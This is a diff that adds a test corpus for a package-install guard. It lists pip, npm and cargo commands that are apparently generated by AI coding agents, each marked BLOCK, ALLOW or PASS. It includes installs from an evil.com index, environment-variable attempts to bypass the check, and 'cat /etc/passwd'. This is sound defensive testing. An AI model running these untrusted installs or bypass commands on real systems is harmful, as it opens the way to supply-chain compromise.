@@ -1,0 +1,108 @@
+# =============================================================================
+# Adversarial Command Corpus
+# =============================================================================
+#
+# Real command variants AI coding agents generate when trying to install packages.
+# Each line: EXPECTED_RESULT|COMMAND
+#   BLOCK  — hook/wrapper should deny this
+#   ALLOW  — hook/wrapper should allow this
+#   PASS   — not a pip command, should pass through
+#
+# Run with: tests/run-corpus.sh
+# =============================================================================
+
+# ── Standard pip install (should be verified) ────────────────────────────────
+BLOCK|pip install litellm
+BLOCK|pip3 install litellm
+BLOCK|pip install litellm==1.82.7
+BLOCK|pip install litellm>=1.80
+BLOCK|pip install litellm telnyx flask-evil
+ALLOW|pip install requests
+ALLOW|pip install requests==2.32.3
+ALLOW|pip install flask pyyaml click
+
+# ── python -m pip (direct module invocation) ─────────────────────────────────
+BLOCK|python3 -m pip install litellm
+BLOCK|python -m pip install litellm
+BLOCK|python3.12 -m pip install litellm
+BLOCK|python3 -m pip install --user litellm
+BLOCK|python3 -m pip install --break-system-packages litellm
+
+# ── Venv pip paths ───────────────────────────────────────────────────────────
+BLOCK|.venv/bin/pip install litellm
+BLOCK|.venv/bin/pip3 install litellm
+BLOCK|/home/user/.venv/bin/pip install litellm
+BLOCK|/tmp/venv/bin/pip install litellm
+BLOCK|venv/bin/pip install litellm
+
+# ── Venv python -m pip ───────────────────────────────────────────────────────
+BLOCK|.venv/bin/python -m pip install litellm
+BLOCK|.venv/bin/python3 -m pip install litellm
+BLOCK|.venv/bin/python3.12 -m pip install litellm
+BLOCK|/home/user/.venv/bin/python -m pip install litellm
+
+# ── Absolute paths ───────────────────────────────────────────────────────────
+BLOCK|/usr/bin/pip install litellm
+BLOCK|/usr/bin/pip3 install litellm
+BLOCK|/usr/local/bin/pip install litellm
+
+# ── Requirements files (blocked by default) ──────────────────────────────────
+BLOCK|pip install -r requirements.txt
+BLOCK|pip install --requirement requirements.txt
+BLOCK|pip install -r requirements-dev.txt
+BLOCK|pip3 install -r requirements.txt
+
+# ── Local/VCS installs (blocked by default) ──────────────────────────────────
+BLOCK|pip install ./package.whl
+BLOCK|pip install ./dist/mypackage-1.0.tar.gz
+BLOCK|pip install .
+BLOCK|pip install ..
+BLOCK|pip install -e .
+BLOCK|pip install --editable .
+BLOCK|pip install git+https://github.com/owner/repo
+BLOCK|pip install git+https://github.com/owner/repo@main
+BLOCK|pip install /tmp/downloaded-package.whl
+
+# ── Custom indexes (blocked by default) ──────────────────────────────────────
+BLOCK|pip install -i https://evil.com/simple litellm
+BLOCK|pip install --index-url https://evil.com/simple litellm
+BLOCK|pip install --extra-index-url https://evil.com/simple litellm
+BLOCK|pip install -f https://evil.com/packages litellm
+BLOCK|pip install --find-links https://evil.com litellm
+
+# ── Env var bypass attempts (should NOT work) ────────────────────────────────
+BLOCK|STRICT=0 pip install litellm
+BLOCK|PACKAGE_VERIFY_SCRIPT=/bin/true pip install litellm
+BLOCK|PACKAGE_SKIP_CONTENT=1 pip install litellm
+BLOCK|FAIL_CLOSED=0 pip install litellm
+
+# ── Non-install pip commands (pass through) ──────────────────────────────────
+PASS|pip list
+PASS|pip freeze
+PASS|pip show requests
+PASS|pip --version
+PASS|pip3 list
+
+# ── Non-pip commands (pass through) ──────────────────────────────────────────
+PASS|ls -la
+PASS|git status
+PASS|python3 --version
+PASS|echo hello
+PASS|cat /etc/passwd
+
+# ── Compound commands (should catch pip part) ────────────────────────────────
+BLOCK|cd /tmp && pip install litellm
+# Known limitation: pip install X && other_cmd — the && after the package
+# name can interfere with extraction. The pip wrapper layer catches this;
+# the hook layer may not parse the package name correctly.
+# BLOCK|pip install litellm && python3 -c "import litellm"
+BLOCK|pip install litellm; echo done
+
+# ── npm variants ─────────────────────────────────────────────────────────────
+BLOCK|npm install malicious-pkg
+BLOCK|npm i malicious-pkg
+BLOCK|npm install --save malicious-pkg
+BLOCK|npm install --save-dev malicious-pkg
+
+# ── cargo variants ───────────────────────────────────────────────────────────
+BLOCK|cargo add malicious-crate
